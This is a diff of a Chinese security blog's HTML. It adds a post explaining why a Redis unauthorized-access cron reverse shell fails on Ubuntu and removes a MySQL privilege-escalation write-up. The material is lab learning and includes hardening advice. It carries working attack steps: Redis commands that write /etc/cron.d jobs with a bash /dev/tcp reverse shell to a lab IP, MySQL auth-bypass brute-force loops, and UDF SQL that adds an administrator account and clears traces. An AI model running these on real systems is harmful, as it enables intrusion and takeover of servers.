@@ -149,6 +149,136 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/" class="post-title-link" itemprop="url">redis未授权写定时任务反弹shell出错解析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-06-17 19:49:00 / 修改时间：22:05:34" itemprop="dateCreated datePublished" datetime="2021-06-17T19:49:00+08:00">2021-06-17</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第二次在总结redis未授权利用方式写crontab时，使用的是Ubuntu，发现反弹shell失败。然而第一次用CentOs时却没有此问题出现。特此刨根问底总结一下原因。</p>
+<h1 id="0x01-cron服务和crontab命令"><a href="#0x01-cron服务和crontab命令" class="headerlink" title="0x01 cron服务和crontab命令"></a>0x01 cron服务和crontab命令</h1><h2 id="1-cron和crontab"><a href="#1-cron和crontab" class="headerlink" title="1.cron和crontab"></a>1.cron和crontab</h2><p>Linux存在需要定期执行的任务-例行性工作，分为用户设置的例行性任务和系统层面的例行性任务，其中：</p>
+<ul>
+<li>cron：执行计划命令的守护程序，会每分钟检查是否有任务需要执行</li>
+<li>crontab：维护某用户crontab 文件的命令</li>
+<li>cron 会查找/var/spool/cron/crontabs/ 目录下的文件及 /etc/crontab 文件中所有 crontab 命令，并读入内存中。</li>
+</ul>
+<p>具体crontab和cron用man自行查看</p>
+<h2 id="2-ubuntu的cron程序位置"><a href="#2-ubuntu的cron程序位置" class="headerlink" title="2.ubuntu的cron程序位置"></a>2.ubuntu的cron程序位置</h2><p>ubuntu下可利用的cron包括：</p>
+<ul>
+<li><p>/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，前提是该任务计划文件的<strong>权限必须为600</strong></p>
+</li>
+<li><p>/etc/crontab：该文件里面的任务计划可直接执行，负责调度各种管理和维护任务</p>
+</li>
+<li><p>/etc/cron.d/*：存放任何要执行的crontab文件或脚本。该目录下任意文件都可被当作任务计划执行，且避免原先任务计划文件被覆盖</p>
+</li>
+<li><p>还可以把脚本放在其他目录，包括</p>
+<p>/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
+</li>
+</ul>
+<blockquote>
+<p>/etc/crontab参数含义：</p>
+<p>m:分钟 - 从0到59的整数 </p>
+<p>h:小时 - 从0到23的整数 </p>
+<p>dom:天 - 从1到31的整数 (必须是指定月份的有效日期) </p>
+<p>mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) </p>
+<p>dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</p>
+<p>user:指的是执行命令的用户 </p>
+<p>command: 需要执行的命令 </p>
+<p><em>表示参数所有可用的值，如果为5个</em>，就代表每分钟执行一次 </p>
+<p>/：指定步进设置。“/<interger>”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</interger></p>
+</blockquote>
+<h1 id="0x02-查找原因"><a href="#0x02-查找原因" class="headerlink" title="0x02 查找原因"></a>0x02 查找原因</h1><p>查看/var/log/syslog可找到相关日志。因syslog记录系统所有日志信息。</p>
+<p>1.写/var/spool/cron目录时</p>
+<p>提示命令执行出现错误，ubuntu会将这些错误信息输出到ubuntu系统的邮件服务器，但是ubuntu系统默认没有安装邮件服务器，所以导致了错误</p>
+<p>错误原因包括：</p>
+<ol>
+<li>/var/spool/cron/crontabs/权限不对劲，并非600</li>
+<li>ubuntu的cron的shell环境为/bin/sh</li>
+</ol>
+<p>针对原因2可采用第二种方式：</p>
+<p>2.写/etc/cron.d目录时</p>
+<p>此时step1先更改/bin/sh为/bash,step2使用bash反弹shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> aaa <span class="string">&quot;nnnn* * * * * root ln -s -f bash /bin/shnnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step1</span><br><span class="line">save</span><br><span class="line"><span class="built_in">set</span> bbb <span class="string">&quot;nnnn* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1nnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step2</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>成功创建任务计划step1和step2，但是还是无法反弹shell。错误日志显示语法错误</p>
+<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/14.png"></p>
+<p>原因：redis向任务计划文件里写内容出现乱码而导致的语法错误。</p>
+<ul>
+<li>centos会忽略乱码去执行格式正确的任务计划</li>
+<li>ubuntu并不会忽略这些乱码，所以导致命令执行失败，作为正常用户向/etc/cron.d目录下写任务计划文件时，命令可以正常执行。利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</li>
+</ul>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>ubuntu确实设计比centos安全，建议遇到ubuntu还是用其他两种方式。具体利用方式参考上一篇文章。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/301606">https://cloud.tencent.com/developer/news/301606</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/">https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -180,7 +310,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-17 00:15:44" itemprop="dateModified" datetime="2021-06-17T00:15:44+08:00">2021-06-17</time>
+                <time title="修改时间：2021-06-17 22:03:16" itemprop="dateModified" datetime="2021-06-17T22:03:16+08:00">2021-06-17</time>
               </span>
 
           <br>
@@ -189,7 +319,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.2k</span>
+              <span>2.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -229,6 +359,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>
 
 <p>当然，别忘了，ubuntu要启动redis-server服务。</p>
+<p>为保证后面写入计划任务，此处以root权限启动redis</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
 <h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
 <p>晓得绝对路径</p>
 <p>当然还要有写入权限</p>
@@ -274,8 +406,23 @@
 </blockquote>
 <p>SSH远程登陆成功</p>
 <p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
-<h2 id="3-写crntab"><a href="#3-写crntab" class="headerlink" title="3. 写crntab"></a>3. 写crntab</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限</p>
-<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
+<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
+<p>多见于CentOs使用</p>
+<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
+<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
+<blockquote>
+<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
+<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
+<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
+<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
+</blockquote>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
+<p>观察到此时并无反弹shell。但是确实写入成功。</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
+<p>具体排查问题另起一篇博客说明。</p>
+<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
 
 <h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
@@ -291,6 +438,8 @@
 <li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
 <li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
+<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
+<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
 </ol>
 
       
@@ -1606,215 +1755,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">MYSQL提权总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-04-15 20:10:49" itemprop="dateCreated datePublished" datetime="2021-04-15T20:10:49+08:00">2021-04-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-27 21:33:43" itemprop="dateModified" datetime="2021-04-27T21:33:43+08:00">2021-04-27</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="0x01-MYSQL漏洞案例："><a href="#0x01-MYSQL漏洞案例：" class="headerlink" title="0x01 MYSQL漏洞案例："></a>0x01 MYSQL漏洞案例：</h1><p>先通过MYSQL身份认证绕过漏洞 CVE-2012-2122开始看起。</p>
-<h2 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1. 漏洞原理："></a>1. 漏洞原理：</h2><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于处理不正确，会导致memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。即只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
-<h2 id="2-影响版本："><a href="#2-影响版本：" class="headerlink" title="2. 影响版本："></a>2. 影响版本：</h2><p>Mariadb、Mysql：几乎影响5.1至5.5的所有版本，包括5.1.61，5.0.11，5.3.5，5.5.22，5.5.23</p>
-<h2 id="3-漏洞复现："><a href="#3-漏洞复现：" class="headerlink" title="3. 漏洞复现："></a>3. 漏洞复现：</h2><p>靶机：Ubuntu 192.168.127.131</p>
-<p>攻击机：kali 192.168.127.130</p>
-<p>环境：docker  vulhub</p>
-<blockquote>
-<p>注：</p>
-<p>[1]除了安装docker-ce docker-io之外，可能需要安装docker-compose</p>
-<p>[2]docker-compose是docker的命令行工具，docker-compose up启动并运行vulhub中的mysql服务。</p>
-<p>[3]进入docker：docker exec -it 69d1 bash</p>
-</blockquote>
-<p> <img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png" alt="img"></p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2.png" alt="img"></p>
-<p>环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过Mysql客户端可直接登录，其root密码是123456。至此靶机环境搭建完成</p>
-<p>攻击机扫描靶机所开放服务：</p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/3.png" alt="img"></p>
-<p>可看到linux服务器开启了mysql，版本为5.5.23</p>
-<h3 id="方法一、用msf直接跑："><a href="#方法一、用msf直接跑：" class="headerlink" title="方法一、用msf直接跑："></a>方法一、用msf直接跑：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">set RHOSTS 192.168.127.131</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/4.png" alt="img"></p>
-<p>可以看到密码的哈希值，一般密码以MD5的格式</p>
-<blockquote>
-<p>注：</p>
-<p>[1] MD5加密结果是128位二进制，也就是32位十六进制数</p>
-<p>[2] SHA-1加密结果是160位二进制，也就是40位十六进制数</p>
-<p>[3] SHA-256加密结果是256位二进制，也就是64位十六进制数</p>
-<p>[4] SHA-512加密结果是512位二进制，也就是128位十六进制数</p>
-<p>[5] RIPEMD160加密结果是160位二进制，也就是40位十六进制数</p>
-</blockquote>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/5.png" alt="img"></p>
-<p>MD5解密</p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/6.png" alt="img"></p>
-<h3 id="方法二、利用bash脚本自动登陆mysql数据库"><a href="#方法二、利用bash脚本自动登陆mysql数据库" class="headerlink" title="方法二、利用bash脚本自动登陆mysql数据库"></a>方法二、利用bash脚本自动登陆mysql数据库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用一个错误的密码登录1000次目标主机的mysql数据库</span></span><br><span class="line">for ((i = 1; i &lt; 1000; i++)) </span><br><span class="line">do</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">        mysql -h 192.168.127.131 -u root -p111111 -P 3306;</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.jpg" alt="img"></p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.jpg" alt="img"></p>
-<h3 id="方法三、Python脚本："><a href="#方法三、Python脚本：" class="headerlink" title="方法三、Python脚本："></a>方法三、Python脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">subprocess.Popen(<span class="string">&quot;mysql -u root -P 3306 -h 192.168.127.131 --password=aaaaa&quot;</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/9.jpg" alt="img"></p>
-<p>todo:看看mysql 5.5.23的paswword.c出问题的具体位置。</p>
-<h1 id="0x02-UDF-提权"><a href="#0x02-UDF-提权" class="headerlink" title="0x02 UDF 提权"></a>0x02 UDF 提权</h1><p>UDF（user defined function）用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充。</p>
-<p>通过添加UDF导出dll，再mysql中使用UDF以高权限账号执行命令，添加账号进行提权</p>
-<h2 id="1-提权条件："><a href="#1-提权条件：" class="headerlink" title="1.提权条件："></a>1.提权条件：</h2><ul>
-<li>知道mysql数据库的账户，有对mysql的insert和delete权限，以创建和抛弃函数。</li>
-<li>有可以将动态链接库udf.dll写入相应目录的权限。</li>
-</ul>
-<h2 id="2-相关知识点"><a href="#2-相关知识点" class="headerlink" title="2.相关知识点"></a>2.相关知识点</h2><h3 id="1-Secure-file-priv参数"><a href="#1-Secure-file-priv参数" class="headerlink" title="1. Secure_file_priv参数"></a>1. Secure_file_priv参数</h3><p>secure-file-priv参数是用来限制LOAD DATA,SELEC,OUTFILE, LOAD_FILE()传递的指定目录</p>
-<ul>
-<li>值为null ：限制mysql不允许导入导出</li>
-<li>值为/tmp/ ：限制mysql的导入导出只能发生在/tmp/目录</li>
-<li>没有具体值：对mysql的导入导出不做限制</li>
-</ul>
-<p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p>
-<h3 id="2-UDF来源"><a href="#2-UDF来源" class="headerlink" title="2.UDF来源"></a>2.UDF来源</h3><p>sqlmap和metasploit中有windows和Linux32和64位的UDF文件，需要先用sqlmap自带解码工具cloak.py对进行异或的UDF文件进行解码:</p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">路径：</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;63&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py</span><br></pre></td></tr></table></figure>
-
-<p>metasploit的UDF动态链接库文件无需解码，路径如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr/share/metasploit-framework/embedded/framework/data/exploits/mysql</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-UDF提供的函数"><a href="#3-UDF提供的函数" class="headerlink" title="3.UDF提供的函数"></a>3.UDF提供的函数</h3><p>hexdump -C lib_mysqludf_sys_64.so | tail -n +118 | head -n 35</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>
-
-<p>此时已经有了udf文件，接下来就要上传到网站的指定目录</p>
-<ul>
-<li>当mysql &lt; 5.0，导出路径随意。</li>
-<li>当5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</li>
-<li>当mysql &gt; 5.1，要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数</li>
-</ul>
-<p>接下来就是寻找插件目录并写入动态链接库：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询软件安装目录</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">--查看 mysql 函数里是否新增sys_eval</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行系统命令试试</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将swanQ加入管理员组</span></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net user swanQ swanQ/add&#x27;</span>); </span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net localgroup administrators swanQ/add&#x27;</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清除痕迹:删除函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;cmdshell&#x27;</span>  </span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-漏洞复现：PHPMailer命令执行利用"><a href="#3-漏洞复现：PHPMailer命令执行利用" class="headerlink" title="3.漏洞复现：PHPMailer命令执行利用"></a>3.漏洞复现：PHPMailer命令执行利用</h2><h3 id="001-环境搭建"><a href="#001-环境搭建" class="headerlink" title="001 环境搭建"></a>001 环境搭建</h3><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/raven/Raven2.ova">靶机下载</a></p>
-<p>攻击机：kali 192.168.127.130</p>
-<p>靶机：Raven 192.168.127.129</p>
-<p>靶机开放了SSH22端口、80和111端口。访问靶机的80端口可查看wordpress博客页面，dirb跑一下目录。发现phpmailer，并查看版本信息，发现存在php命令执行漏洞。找到靶机发邮件的位置contact.php。</p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/10.jpg"></p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/11.jpg"></p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/12.jpg"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 定位exp位置</span></span><br><span class="line">locate exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>
-
-<p>更改参数后，运行代码，此时目录下会生成back.php</p>
-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/14.jpg"></p>
